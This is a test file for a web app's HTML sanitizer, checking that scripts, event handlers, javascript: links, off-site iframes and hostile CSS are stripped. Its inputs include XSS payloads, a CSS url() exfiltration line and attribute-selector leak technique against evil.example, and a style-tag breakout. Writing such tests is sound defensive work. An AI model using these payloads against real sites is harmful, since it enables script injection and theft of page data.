import { describe, expect, it } from "vitest";
import { sanitizeContentHtml, sanitizeInlineHtml } from "@/shared/security/server/sanitize-html";
import { ALL_SLOTS } from "@/modules/content/site-content";
import pages from "@/data/pages.json";

describe("sanitizeInlineHtml", () => {
  it("keeps paragraphs, bold, italic and safe links", () => {
    expect(sanitizeInlineHtml('<p>A <strong>b</strong> <em>c</em> <a href="/about">d</a></p>')).toBe(
      '<p>A <strong>b</strong> <em>c</em> <a href="/about">d</a></p>'
    );
  });

  it("translates what browsers emit while editing", () => {
    expect(sanitizeInlineHtml("<div>One <b>two</b> <i>three</i></div>")).toBe("<p>One <strong>two</strong> <em>three</em></p>");
  });

  it("opens off-site links in a new tab with no handle back", () => {
    expect(sanitizeInlineHtml('<a href="https://example.com">x</a>')).toBe(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>'
    );
  });

  it("drops scripts, handlers, styles and unsafe links but keeps the words", () => {
    expect(sanitizeInlineHtml('<p onclick="x()" style="color:red" class="big">Hi<script>alert(1)</script></p>')).toBe("<p>Hi</p>");
    expect(sanitizeInlineHtml('<a href="javascript:alert(1)">click</a>')).toBe("click");
    expect(sanitizeInlineHtml('<a href="//evil.example">away</a>')).toBe("away");
    expect(sanitizeInlineHtml("<h1>Big</h1><img src=x>")).toBe("Big");
  });

  it("treats nothing but empty paragraphs as empty", () => {
    expect(sanitizeInlineHtml("<p><br></p><p>&nbsp;</p>")).toBe("");
  });

  it("leaves every rich-text default exactly as written", () => {
    for (const slot of ALL_SLOTS.filter((entry) => entry.kind === "richtext")) {
      expect(sanitizeInlineHtml(slot.fallback ?? ""), slot.id).toBe(slot.fallback);
    }
  });
});

describe("sanitizeContentHtml", () => {
  it("keeps every seeded page free of embedded CSS", () => {
    for (const item of pages) {
      expect(item.content_html, item.slug).not.toMatch(/<style\b|\bstyle\s*=/i);
    }
  });

  it("strips script tags entirely", () => {
    expect(sanitizeContentHtml('<p>hi</p><script>alert(1)</script>')).toBe("<p>hi</p>");
  });

  it("strips inline event handler attributes", () => {
    expect(sanitizeContentHtml('<img src="x.jpg" onerror="alert(1)">')).not.toContain("onerror");
  });

  it("strips javascript: URLs from links", () => {
    const out = sanitizeContentHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toContain("javascript:");
  });

  it("keeps ordinary WP-style content", () => {
    const html =
      '<div class="wp-block-buttons"><figure class="wp-block-image"><img src="https://x.co/a.jpg" alt="a"></figure>' +
      '<p><strong>Bold</strong> text with a <a href="https://example.com">link</a>.</p></div>';
    expect(sanitizeContentHtml(html)).toContain('<img src="https://x.co/a.jpg" alt="a"');
    expect(sanitizeContentHtml(html)).toContain("<strong>Bold</strong>");
    expect(sanitizeContentHtml(html)).toContain('href="https://example.com"');
  });

  it("converts stored block styles to static Tailwind utilities without weakening sanitization", () => {
    const out = sanitizeContentHtml(
      '<div class="wp-block-columns"><figure class="wp-block-image aligncenter"><img src="/photo.jpg" onerror="alert(1)"></figure>' +
      '<div class="wp-block-button is-style-secondary"><a class="wp-block-button__link" href="/about" target="_blank">Read more</a></div></div>'
    );
    expect(out).toContain("flex flex-wrap mb-6 gap-8 max-[768.001px]:flex-col");
    expect(out).toContain("[&amp;.aligncenter]:text-center");
    expect(out).toContain("bg-button-bg text-button-text");
    expect(out).toContain("is-style-secondary");
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("<style>");
  });

  it("drops object and embed tags", () => {
    const out = sanitizeContentHtml('<object data="x"></object><embed src="y">');
    expect(out).not.toContain("object");
    expect(out).not.toContain("embed");
  });

  it("keeps only allowlisted inline style properties", () => {
    const out = sanitizeContentHtml('<p style="color: red; position: fixed; top: 0;">x</p>');
    expect(out).toContain("color:red");
    expect(out).not.toContain("position");
  });

  it("adds rel=noopener noreferrer to links", () => {
    const out = sanitizeContentHtml('<a href="https://example.com" target="_blank">go</a>');
    expect(out).toContain('rel="noopener noreferrer"');
  });
});

describe("visual builder output", () => {
  // The builder (components/editor/HtmlEditor.tsx) serialises as a marker
  // comment, then one <style> block, then the markup. An earlier allowlist
  // dropped <style> and <section>, which rendered every builder-made page as
  // unstyled bare text.
  const BUILDER = `<style>.getaways-section{padding:32px;background-color:#fff}</style>
<section class="getaways-section"><h2>Titulo</h2><p>Texto</p></section>
<article class="gx-article"><blockquote>Cita</blockquote></article>`;

  it("keeps the stylesheet the builder writes", () => {
    const out = sanitizeContentHtml(BUILDER);
    expect(out).toContain("<style>");
    expect(out).toContain("padding:32px");
  });

  it("keeps the structural tags the builder emits", () => {
    const out = sanitizeContentHtml(BUILDER);
    expect(out).toContain("<section");
    expect(out).toContain("<article");
    expect(out).toContain("<blockquote>");
  });

  it("keeps builder layout properties in inline styles", () => {
    const out = sanitizeContentHtml('<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">x</div>');
    expect(out).toContain("display:grid");
    expect(out).toContain("grid-template-columns");
  });
});

describe("video embeds", () => {
  it("keeps a YouTube embed", () => {
    const out = sanitizeContentHtml('<iframe src="https://www.youtube.com/embed/abc123" allowfullscreen></iframe>');
    expect(out).toContain("<iframe");
    expect(out).toContain("youtube.com/embed/abc123");
  });

  it("keeps a youtube-nocookie embed, which is what the Video block emits", () => {
    const out = sanitizeContentHtml('<iframe src="https://www.youtube-nocookie.com/embed/abc123"></iframe>');
    expect(out).toContain("youtube-nocookie.com/embed/abc123");
  });

  it("keeps a Vimeo embed", () => {
    const out = sanitizeContentHtml('<iframe src="https://player.vimeo.com/video/123"></iframe>');
    expect(out).toContain("player.vimeo.com/video/123");
  });

  it("hardens embeds it keeps", () => {
    const out = sanitizeContentHtml('<iframe src="https://www.youtube.com/embed/abc123"></iframe>');
    expect(out).toContain('referrerpolicy="no-referrer"');
    expect(out).toContain('loading="lazy"');
  });

  // The containment that makes allowing <iframe> acceptable at all.
  it("drops an iframe pointing anywhere else", () => {
    expect(sanitizeContentHtml('<iframe src="https://evil.example/x"></iframe>')).not.toContain("<iframe");
    expect(sanitizeContentHtml('<iframe src="https://youtube.com.evil.example/x"></iframe>')).not.toContain("<iframe");
  });

  it("drops an iframe with no src or a relative one", () => {
    expect(sanitizeContentHtml("<iframe></iframe>")).not.toContain("<iframe");
    expect(sanitizeContentHtml('<iframe src="/local"></iframe>')).not.toContain("<iframe");
  });

  it("drops a javascript: iframe", () => {
    expect(sanitizeContentHtml('<iframe src="javascript:alert(1)"></iframe>')).not.toContain("javascript:");
  });

  it("keeps a self-hosted video without its event handlers", () => {
    const out = sanitizeContentHtml('<video src="https://x.co/a.mp4" controls onplay="alert(1)"></video>');
    expect(out).toContain("<video");
    expect(out).not.toContain("onplay");
  });
});

describe("stylesheet filtering", () => {
  it("removes @import so a page cannot pull in a remote stylesheet", () => {
    const out = sanitizeContentHtml('<style>@import url("https://evil.example/x.css");.a{color:red}</style>');
    expect(out).not.toContain("@import");
    expect(out).toContain("color:red");
  });

  // input[value^="a"]{background:url(https://evil/?a)} leaks page content one
  // request at a time; relative urls and data: images stay.
  it("neutralises off-origin url() exfiltration while keeping local assets", () => {
    const out = sanitizeContentHtml(
      '<style>.a{background:url(https://evil.example/?leak)}.b{background:url(/local.png)}</style>'
    );
    expect(out).not.toContain("evil.example");
    expect(out).toContain("url(/local.png)");
  });

  it("removes legacy script-in-css vectors", () => {
    const out = sanitizeContentHtml(
      '<style>.a{width:expression(alert(1));behavior:url(#x);-moz-binding:url(#y)}</style>'
    );
    expect(out).not.toContain("expression(");
    expect(out).not.toContain("behavior:");
    expect(out).not.toContain("-moz-binding:");
  });

  it("does not let a stylesheet break out of its own block", () => {
    const out = sanitizeContentHtml('<style>.a{color:red}</style ><script>alert(1)</script>');
    expect(out).not.toContain("<script");
    expect(out).not.toContain("alert(1)");
  });

  it("emits no style tag when a page has no stylesheet", () => {
    expect(sanitizeContentHtml("<p>plain</p>")).toBe("<p>plain</p>");
  });
});
